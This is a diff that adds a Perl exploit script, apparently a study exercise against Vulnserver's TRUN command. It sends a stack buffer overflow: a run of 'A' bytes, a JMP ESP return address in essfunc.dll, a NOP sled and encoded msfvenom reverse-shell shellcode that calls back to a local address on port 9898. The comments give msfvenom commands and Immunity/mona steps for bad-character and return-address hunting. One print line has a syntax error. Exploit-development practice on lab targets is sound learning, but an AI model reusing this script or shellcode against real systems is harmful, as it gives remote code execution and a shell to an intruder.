@@ -1,0 +1,95 @@
+#!/usr/bin/perl
+#
+#
+use IO::Socket;
+
+if (@ARGV < 2) {
+	die("Usage: $0 IP_ADDRESS PORT\n\n");
+}
+
+$size = 2003;
+$header = "TRUN /.:/";			# data header
+$ebp = "\x41" x $size;			# \x41 == 'A'
+# bp 0x625011AF and then run F7 
+$eip = "\xaf\x11\x50\x62";		# $eip should set with "\xAF\x11\x50\x62" 
+# $eip = pack('V', 0x6250111af);	# JMP ESP, essfunc.dll
+
+
+# bad charachers is \x00\x10
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.94 LPORT=9898 -f pl -a x86 --platform windows -b "\x00\x01" -e x86/shikata_ga_nai -i 3
+
+# msfvenom —platform Windows -p windows/shell_reverse_tcp LHOST=192.168.2.94 LPORT=9494 EXITFUNC=thread -f pl -a x86 -b "\x00"
+# exp length is 351
+$exp = 
+"\xd9\xca\xb8\xba\x81\x79\x04\xd9\x74\x24\xf4\x5b\x33\xc9" .
+"\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x51\x7d\x9b\xf1\x59" .
+"\x96\xde\xfa\xa1\x67\xbf\x73\x44\x56\xff\xe0\x0d\xc9\xcf" .
+"\x63\x43\xe6\xa4\x26\x77\x7d\xc8\xee\x78\x36\x67\xc9\xb7" .
+"\xc7\xd4\x29\xd6\x4b\x27\x7e\x38\x75\xe8\x73\x39\xb2\x15" .
+"\x79\x6b\x6b\x51\x2c\x9b\x18\x2f\xed\x10\x52\xa1\x75\xc5" .
+"\x23\xc0\x54\x58\x3f\x9b\x76\x5b\xec\x97\x3e\x43\xf1\x92" .
+"\x89\xf8\xc1\x69\x08\x28\x18\x91\xa7\x15\x94\x60\xb9\x52" .
+"\x13\x9b\xcc\xaa\x67\x26\xd7\x69\x15\xfc\x52\x69\xbd\x77" .
+"\xc4\x55\x3f\x5b\x93\x1e\x33\x10\xd7\x78\x50\xa7\x34\xf3" .
+"\x6c\x2c\xbb\xd3\xe4\x76\x98\xf7\xad\x2d\x81\xae\x0b\x83" .
+"\xbe\xb0\xf3\x7c\x1b\xbb\x1e\x68\x16\xe6\x76\x5d\x1b\x18" .
+"\x87\xc9\x2c\x6b\xb5\x56\x87\xe3\xf5\x1f\x01\xf4\xfa\x35" .
+"\xf5\x6a\x05\xb6\x06\xa3\xc2\xe2\x56\xdb\xe3\x8a\x3c\x1b" .
+"\x0b\x5f\x92\x4b\xa3\x30\x53\x3b\x03\xe1\x3b\x51\x8c\xde" .
+"\x5c\x5a\x46\x77\xf6\xa1\x01\xb8\xaf\xab\x8f\x50\xb2\xab" .
+"\x0a\xb7\x3b\x4d\x3e\xa7\x6d\xc6\xd7\x5e\x34\x9c\x46\x9e" .
+"\xe2\xd9\x49\x14\x01\x1e\x07\xdd\x6c\x0c\xf0\x2d\x3b\x6e" .
+"\x57\x31\x91\x06\x3b\xa0\x7e\xd6\x32\xd9\x28\x81\x13\x2f" .
+"\x21\x47\x8e\x16\x9b\x75\x53\xce\xe4\x3d\x88\x33\xea\xbc" .
+"\x5d\x0f\xc8\xae\x9b\x90\x54\x9a\x73\xc7\x02\x74\x32\xb1" .
+"\xe4\x2e\xec\x6e\xaf\xa6\x69\x5d\x70\xb0\x75\x88\x06\x5c" .
+"\xc7\x65\x5f\x63\xe8\xe1\x57\x1c\x14\x92\x98\xf7\x9c\xb2" .
+"\x7a\xdd\xe8\x5a\x23\xb4\x50\x07\xd4\x63\x96\x3e\x57\x81" .
+"\x67\xc5\x47\xe0\x62\x81\xcf\x19\x1f\x9a\xa5\x1d\x8c\x9b" .
+"\xef";
+
+$exp_len = length($exp);
+
+
+# $nop = "\x90" x (3000 - 2007 - $exp_len); 	# nop 
+$nop = "\x90" x 32; 	# nop 
+$esp = $nop.$exp;
+
+$custom_pattern = $header.$ebp.$eip.$esp;	# eip will be set 0x6250111af
+
+# if we use immunity debugger, we can use moma comamnd ==> essfunc.dll
+# !mona modules          ==> find out the modules we are running
+# use msf-nasm_shell  comamnd, input << JMP ESP >>, It will return hex code ==> FFE4
+# !mona find -s "\xff\xe4" -m essfunc.dll	==> It's will return a lot of results, we use the top address 0x625011AF
+#
+
+# $esp should store our expoit code
+# the next step we need to find out the bad characters
+#
+# step one
+# !mona config -set workingfolder c:\tmp\%p
+# !mona bytearray -b "\x00" ==> "\x00" are useually bad characters
+# !mona compare -f c:\tmp\vulnserver\bytearray.bin -a $esp
+#
+# step after compare bytearray, immunity debugger return bad character is 00 01
+# so we could generate shell code by according to msfvenom 
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.94 LPORT=9898 -f pl -a x86 --platform windows -b "\x00\x01" -e x86/shikata_ga_nai -i 3
+
+$socket = IO::Socket::INET->new (
+	Proto => "tcp",
+	PeerAddr => "$ARGV[0]",	
+	PeerPort => "$ARGV[1]"
+) or die "Cannot connect to $ARGV[0]:$ARGV[1]";
+
+$socket->recv($serverdata, 1024);
+print "$serverdata"."\n";
+
+print "Sending data: ebp"."\n";
+print($ebp);
+$socket->send($ebp);
+print "Sending data: custom_pattern"."\n";
+print($custom_pattern));
+$socket->send($custom_pattern);
+
+# send buffer
+# $socket->send($baddata);
